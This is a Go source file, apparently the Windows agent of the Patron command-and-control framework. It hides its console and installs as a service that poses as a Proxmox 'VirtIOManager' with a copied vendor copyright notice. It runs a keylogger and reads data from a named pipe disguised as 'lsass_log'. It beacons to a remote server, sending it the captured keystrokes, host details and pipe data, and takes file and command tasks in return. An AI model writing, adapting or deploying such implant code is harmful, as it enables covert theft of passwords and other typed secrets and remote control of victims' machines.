//go:build windows
// +build windows

package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/client/windows_utils"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/kardianos/service"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	TransportProtocol string
	cache             string
)

const (
	delayKeyfetchMS = 5
	pipeName        = `\\.\pipe\lsass_log`
)

type spool struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

func (p *program) Stop(s service.Service) error {
	return nil
}

func HideConsoleWindow() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")

	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, uintptr(0)) // SW_HIDE = 0
	}
}

func (p *program) run() {
	*client_utils.ClientConfig.ServerIP = ServerIP
	*client_utils.ClientConfig.ServerPort = ServerPort
	*client_utils.ClientConfig.CallbackFrequency = CallbackFrequency
	*client_utils.ClientConfig.CallbackJitter = CallbackJitter
	*client_utils.ClientConfig.TransportProtocol = TransportProtocol

	client_utils.Initialize(LoggingEnabled)

	pipeName := `\\.\pipe\lsass_log`

	keylogger := windows_utils.NewKeylogger()

	go func() {
		for {
			key := keylogger.GetKey()
			if !key.Empty {
				cache = cache + string(key.Rune)
				logger.Logf(logger.Info, "Current cache: %v", cache)
			}
			time.Sleep(delayKeyfetchMS * time.Millisecond)
		}
	}()

	// Handle socket listener
	var (
		mu      sync.Mutex
		builder strings.Builder
	)

	sock := windows_utils.New(pipeName, func(msg string) error {
		mu.Lock()
		defer mu.Unlock()

		builder.WriteString(msg)
		logger.Logf(logger.Debug, "Got message from socket at %v: %v", pipeName, msg)
		return nil
	})

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	errCh := make(chan error, 1)

	go func() {
		errCh <- sock.Run(ctx)
	}()

	go func() {
		<-ctx.Done()
		logger.Log(logger.Info, "Signal received, stopping socket...")
		sock.Stop()
		stop()
	}()

	hostname, username := client_utils.GenerateAgentMetadata()
	filepath := client_utils.GetExecutablePath()
	capabilities := append(client_utils.DefaultCapabilities(), "keylogger", "cache_socket")
	logger.Logf(logger.Info, "Collected startup metadata. Hostname: %v. Username: %v", hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		config, err := client_utils.LoadCertificate(RootCert, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			log.Fatalf("Failed to load certificate: %v\n", err)
		}
		logger.Logf(logger.Info, "Creating a beacon using %v:%v/%v", *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		beacon, err := client_utils.EstablishConnection(config, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		agentID, err := client_utils.HandleStartupRequest(beacon, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory, capabilities)
		if err != nil {
			client_utils.HandleError(beacon, "startup", err)
			continue
		}
		sleepDuration, err := client_utils.HandleConfigurationRequest(
			beacon, agentID,
			*client_utils.ClientConfig.ServerIP,
			*client_utils.ClientConfig.ServerPort,
			*client_utils.ClientConfig.CallbackFrequency,
			*client_utils.ClientConfig.CallbackJitter,
			*client_utils.ClientConfig.TransportProtocol,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		if err := handleCacheSocketRequest(beacon, agentID, &mu, &builder); err != nil {
			client_utils.HandleError(beacon, "cachesocket", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping for %.2fs", sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Server returned non-positive sleep duration. Skipping sleep.")
		}
	}
}

func main() {
	HideConsoleWindow()
	svcConfig := &service.Config{
		Name:        "VirtIOManager",
		DisplayName: "VirtIOManager",
		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	err = s.Run()
	if err != nil {
		log.Fatal(err)
	}
}

func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {

	if cache == "" {
		logger.Logf(logger.Info, "No logs to send, skipping keys request")
		return nil
	}

	logger.Logf(logger.Info, "Sending keylogs: %v", cache)

	req := &patronobuf.Request{
		Type: patronobuf.RequestType_KEYS,
		Payload: &patronobuf.Request_Keys{
			Keys: &patronobuf.KeysRequest{
				Uuid: agentID,
				Keys: cache,
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return fmt.Errorf("failed to send keys request: %w", err)
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return fmt.Errorf("failed to read keys response: %w", err)
	}

	cache = ""
	return nil
}

func handleCacheSocketRequest(beacon io.ReadWriteCloser, agentID string, mu *sync.Mutex, builder *strings.Builder) error {
	mu.Lock()

	if builder.Len() == 0 {
		logger.Logf(logger.Info, "No logs to send, skipping socket cache request")
		mu.Unlock()
		return nil
	}

	data := builder.String()
	builder.Reset()
	mu.Unlock()

	logger.Logf(logger.Info, "Sending cache data: %v", data)

	req := &patronobuf.Request{
		Type: patronobuf.RequestType_KEYS,
		Payload: &patronobuf.Request_Keys{
			Keys: &patronobuf.KeysRequest{
				Uuid: agentID,
				Keys: data,
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return fmt.Errorf("failed to send keys request: %w", err)
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return fmt.Errorf("failed to read keys response: %w", err)
	}

	return nil
}
